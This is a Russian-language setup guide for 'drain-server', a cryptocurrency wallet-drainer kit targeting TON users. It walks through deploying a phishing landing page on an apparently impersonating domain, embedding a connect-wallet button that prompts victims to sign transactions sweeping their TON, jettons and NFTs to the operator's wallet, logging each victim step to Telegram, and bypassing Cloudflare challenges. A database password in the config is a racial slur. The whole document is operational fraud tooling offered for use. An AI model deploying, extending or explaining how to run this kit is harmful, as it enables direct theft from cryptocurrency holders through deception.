# drain-server — гайд по установке

Автономный бэкенд + фронт-кит. Без telegram-бота как процесса — логи летят прямо в твой чат через Bot API.

## Что умеет

- Кнопка Connect Wallet → TonConnect модалка (TonKeeper, @wallet, MyTonWallet и др.)
- После коннекта — сбор транзакций: TON, jetton'ы, NFT-подарки (103+ коллекций Fragment)
- Отстук каждого шага в твой Telegram-чат: заход, коннект, подтверждение, отказ
- Всё на твоём кошельке — WALLET в .env, деньги идут туда

## Структура

```
src/
├── index.ts          — вход, поднимает http-сервер на :49238
├── server/           — express-роуты (/transaction, /connected, /accept, /reject)
│   └── utils/        — отправка логов в Telegram (просто sendMessage, без бота)
├── contracts/        — билдеры транзакций (TON, NFT, jetton, fragment-аукционы, honeypot)
├── api/              — TonAPI клиент + сканер ассетов (баланс, NFT, jetton'ы)
├── database/         — prisma (настройки: цены, режимы)
└── front/            — connect.js (кнопка кошелька + дрейн), address.js, manifest
prisma/               — схема + миграции
```

## Установка (Ubuntu 24.04)

### 1. Зависимости

```bash
apt update && apt install -y curl docker.io docker-compose-v2
curl -fsSL https://bun.sh/install | bash
# перелогинься или source ~/.bashrc чтобы bun был в PATH
```

### 2. Распаковать и поднять Postgres

```bash
mkdir -p /opt/drain-server
# закинь файлы сюда (scp/rsync/git — как угодно)
cd /opt/drain-server
docker compose up -d
sleep 8   # ждём пока постгрес поднимется
```

### 3. Установка + миграции

```bash
bun install
bunx prisma generate
bunx prisma migrate deploy
```

### 4. Конфиг .env

```bash
cat > /opt/drain-server/.env << 'EOF'
DATABASE_URL=postgresql://fragment:nigger@localhost:5432/drainer
BOT_TOKEN=123456:ABC...
LOGGING_CHANNEL=-100XXXXXXXXXX
WALLET=EQ...
URL=https://worldlibertyfi.trade
TONAPI_KEY=
DEBUG=drainer:*
EOF
```

⚠️ **Формат строго `KEY=value`** — без пробелов вокруг `=`, без кавычек, без виндовых переносов строк. Иначе ничего не заведётся и будешь час искать почему.

Что куда:

| Переменная | Что это |
|---|---|
| `BOT_TOKEN` | Токен бота из @BotFather. Нужен ТОЛЬКО чтобы слать логи, сам бот не запускается |
| `LOGGING_CHANNEL` | ID чата куда летят отстуки. Группа: `-556...`, канал: `-100556...`. Бота добавить в чат! |
| `WALLET` | Твой TON-кошелёк (EQ...) — сюда собирается всё |
| `URL` | Домен лендинга |
| `TONAPI_KEY` | Ключ с tonconsole.com (не обязателен, но без него рейт-лимиты TonAPI) |

### 5. Получить ID чата для логов

1. Создай бота у @BotFather → токен в .env
2. Создай группу или канал для логов
3. Добавь туда бота (в канал — админом с правом постить)
4. Напиши любое сообщение в чат
5. Перешли сообщение боту @getidsbot → он даст ID
6. ID из getidsbot уже с минусом — копируй целиком в LOGGING_CHANNEL

Проверка что логи работают:

```bash
curl -s "https://api.telegram.org/bot_ТОКЕН/sendMessage?chat_id=АЙДИ_ЧАТА&text=TEST"
```

Вернулось `"ok":true` — всё, отстуки поедут. `chat not found` — бота нет в чате или ID неверный.

### 6. Запуск вручную (проверка)

```bash
cd /opt/drain-server
bun run src/index.ts
```

Должно вывести: `Started server on 49238 port`

### 7. systemd — чтобы жил всегда

```bash
cat > /etc/systemd/system/drain.service << 'EOF'
[Unit]
Description=Drain Server
After=network.target docker.service

[Service]
WorkingDirectory=/opt/drain-server
EnvironmentFile=/opt/drain-server/.env
ExecStart=/root/.bun/bin/bun run ./src/index.ts
Restart=always
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now drain
journalctl -u drain -f   # смотреть логи
```

(если bun стоит не под root — поправь путь в ExecStart, например `/home/user/.bun/bin/bun`)

### 8. nginx — проксирование на 443

```bash
apt install -y nginx certbot python3-certbot-nginx

# сертификат (порт 80 должен быть свободен)
systemctl stop nginx
certbot certonly --standalone -d worldlibertyfi.trade --non-interactive --agree-tos -m admin@worldlibertyfi.trade

cat > /etc/nginx/sites-available/drain << 'EOF'
server {
    listen 443 ssl http2;
    server_name worldlibertyfi.trade;

    ssl_certificate     /etc/letsencrypt/live/worldlibertyfi.trade/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/worldlibertyfi.trade/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:49238;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF

ln -sf /etc/nginx/sites-available/drain /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl start nginx
```

### 9. Cloudflare — ОБЯЗАТЕЛЬНО

Если домен за Cloudflare с managed challenge — кошельки и фронт не смогут скачать JSON (получат капчу вместо данных → `invalid manifest`).

**Dashboard → Security → WAF → Custom rules → Create rule:**

- Name: `drain bypass`
- When: URI Path **is in** `/tonconnect-manifest.json, /transaction, /connected, /accept, /reject, /disconnect, /manifest/*`
- Then: Action = **Skip**, отметить все галки (Managed Challenge, Rate Limiting, всё)

Проверка:

```bash
curl -s https://worldlibertyfi.trade/tonconnect-manifest.json
```

Должен вернуться чистый JSON. Если "Just a moment..." — правило не сработало, проверь пути.

### 10. Manifest

```bash
nano /opt/drain-server/src/front/tonconnect-manifest.json
```

```json
{
  "url": "https://worldlibertyfi.trade",
  "name": "App",
  "iconUrl": "https://worldlibertyfi.trade/icon.png",
  "termsOfUseUrl": "https://worldlibertyfi.trade/terms",
  "privacyPolicyUrl": "https://worldlibertyfi.trade/privacy"
}
```

Иконку (icon.png) положи на домен — кошельки её качают.

```bash
systemctl restart drain
```

## Подключение к лендингу

На страницу лендинга:

```html
<!-- в head -->
<script src="https://unpkg.com/@tonconnect/ui@3.0.2/dist/tonconnect-ui.min.js"></script>
<script src="address.js"></script>

<!-- перед </body> -->
<script>
  window.DRAINER_BACKEND = "https://worldlibertyfi.trade";
</script>
<script src="connect.js"></script>

<!-- любая кнопка запускает флоу -->
<button onclick="drainWallet()">CONNECT WALLET</button>
```

Флоу: клик → модалка выбора кошелька → коннект → клик по твоей кнопке → кошелёк показывает транзакцию на подтверждение → отстук в чат (принял/отказался).

## API

| Роут | Метод | Что делает |
|---|---|---|
| `/transaction` | GET | `?wallet=EQ...` — собирает пачку транзакций под этот кошелёк |
| `/connected` | POST | `{wallet, href, raw}` — лог коннекта |
| `/accept` | POST | `{messages, boc, wallet, raw, href}` — лог подтверждения |
| `/reject` | POST | `{messages, err, wallet, href}` — лог отказа |
| `/disconnect` | POST | `{wallet, href}` — лог отключения |
| `/manifest/:domain` | GET | manifest для любого домена (CORS открыт) |

CORS открыт на всё (`*`) — заточено под подключение лендинга с любого домена.

`/transaction` понимает два формата параметров:

- Telegram миниапп: `?tgWebAppStartParam=<base64>`
- Обычный веб: `?workerId=1&drainMode=Full&amount=100&item=@username`

## Режимы дрейна

- `Full` — TON + NFT + jetton'ы, всё подряд
- `NFT` — только NFT
- `Trade` — конкретный NFT под сделку

Передаются в `/transaction` через `drainMode`.

## Проверка что всё живое

```bash
# 1. Сервер крутится?
systemctl status drain

# 2. Логи без ошибок?
journalctl -u drain -n 20

# 3. API отвечает?
curl -s "https://worldlibertyfi.trade/transaction?wallet=EQCD39VS5jcptHL8vMjEXrzGaRc-hPfrx2CT-HTF5-Lfnz5n&workerId=1&drainMode=Full"

# 4. Manifest чистый?
curl -s https://worldlibertyfi.trade/tonconnect-manifest.json
```

## Траблшутинг

| Симптом | Причина |
|---|---|
| `invalid manifest` | Cloudflare перехватывает — правило из шага 9 |
| Кнопка жмётся, ничего не происходит | Manifest не находитcя / CDN не загрузился — Network tab в devtools |
| Коннект есть, кнопка дрейна молчит | `DRAINER_BACKEND` неверный или за challenge — Network tab |
| Нет отстуков в чат | ID чата неверный или бота нет в чате — curl-тест из шага 5 |
| Бот не стартует | .env формат — пробелы/кавычки/CRLF |
| Кошелёк пишет "invalid message" | Проблема на стороне бэкенда — journalctl |

## Полезное

```bash
systemctl restart drain                    # рестарт после правки .env
journalctl -u drain -f                     # живые логи
docker exec postgres psql -U fragment -d drainer   # база руками
```
